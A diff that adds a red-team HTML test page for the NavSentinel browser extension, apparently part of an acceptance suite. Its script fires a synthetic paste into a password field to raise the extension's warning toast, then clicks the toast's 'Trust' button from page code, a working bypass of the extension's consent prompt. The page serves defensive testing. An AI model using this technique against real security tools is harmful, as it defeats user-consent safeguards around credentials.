@@ -1,0 +1,47 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Red-team - toast control activation (hostile page)</title>
+</head>
+<body>
+  <h1>Hostile page - toast control (acceptance red-team)</h1>
+  <p>Triggers NavSentinel's paste-warning toast, then synthesizes a click on the
+     toast's own "Trust" action to demonstrate that extension-owned toast
+     controls activate on untrusted (page-synthesized) clicks.</p>
+  <form>
+    <input id="pw" type="password" autocomplete="current-password" />
+  </form>
+  <script>
+    // Trigger the paste-warning toast with a page-dispatched (untrusted) paste
+    // event. The credential guard's paste handler does not gate on isTrusted.
+    window.__armPasteToast = () => {
+      const pw = document.getElementById("pw");
+      pw.focus();
+      const dt = new DataTransfer();
+      dt.setData("text/plain", "stolen-secret");
+      const ev = new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, composed: true, cancelable: true });
+      pw.dispatchEvent(ev);
+      return "dispatched";
+    };
+
+    window.__toastButtons = () => {
+      const host = document.getElementById("__navsentinel_toast_host");
+      if (!host || !host.shadowRoot) return null;
+      return Array.from(host.shadowRoot.querySelectorAll("button")).map((b) => b.textContent.trim());
+    };
+
+    // Attacker capability: an UNTRUSTED synthetic click on a toast action button
+    // whose label starts with the given prefix (e.g. "Trust").
+    window.__synthClickToast = (prefix) => {
+      const host = document.getElementById("__navsentinel_toast_host");
+      if (!host || !host.shadowRoot) return "no-host";
+      const btn = Array.from(host.shadowRoot.querySelectorAll("button"))
+        .find((b) => b.textContent.trim().startsWith(prefix));
+      if (!btn) return "no-button";
+      btn.click(); // synthetic => event.isTrusted === false
+      return "clicked";
+    };
+  </script>
+</body>
+</html>
